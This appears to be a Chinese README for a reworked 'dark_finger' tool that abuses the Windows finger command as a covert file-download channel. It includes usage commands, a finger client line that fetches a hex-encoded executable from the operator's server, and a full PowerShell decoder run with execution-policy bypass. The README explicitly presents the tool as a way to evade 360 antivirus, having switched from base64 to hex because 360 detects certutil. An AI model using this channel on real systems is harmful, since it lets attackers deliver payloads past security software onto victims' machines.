本项目是基于`dark_finger`的二次开发 增加易用性 

移除了原有的base64编码 改用hex 因为360杀`certutil`很严

原脚本 https://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt

![image-20241019150729661](https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202410191507789.png)

`dark_finger`是基于`finger`实现的windows文件传输的服务端 截止2024年10月19日 免杀360
# 使用方法

1. 同目录下创建配置文件`finger.conf`
   
    内容为所需下载的文件名如 `calc.exe`

2. 同目录下放置该文件

    在同目录下放置`calc.exe`

3. 启动服务端监听

    `python dark_finder.py -c finger.conf`

4. 客户端交互

    `finger [filename]@[dark_finder] > dump.txt`

    写入文件的前两行是 空行和服务端信息 需要舍弃

5. 通过powershell解码 转 exe

    `powershell -ExecutionPolicy Bypass -File decode.ps1 calc.txt calc.exe`

    ```powershell
    param(
        [string]$sourceFile,
        [string]$destinationFile
    )

    $lines = Get-Content $sourceFile
    $hexString = ($lines[2..$lines.Length] -join '' -replace '\s+', '')
    $byteList = New-Object System.Collections.Generic.List[byte]

    for ($i = 0; $i -lt $hexString.Length; $i += 2) {
        if ($i + 1 -lt $hexString.Length) {
            $byte = [Convert]::ToByte($hexString.Substring($i, 2), 16)
            $byteList.Add($byte)
        } 
    }


    [System.IO.File]::WriteAllBytes($destinationFile, $byteList.ToArray())

    ```
# 具体细节可参考
https://xz.aliyun.com/t/15899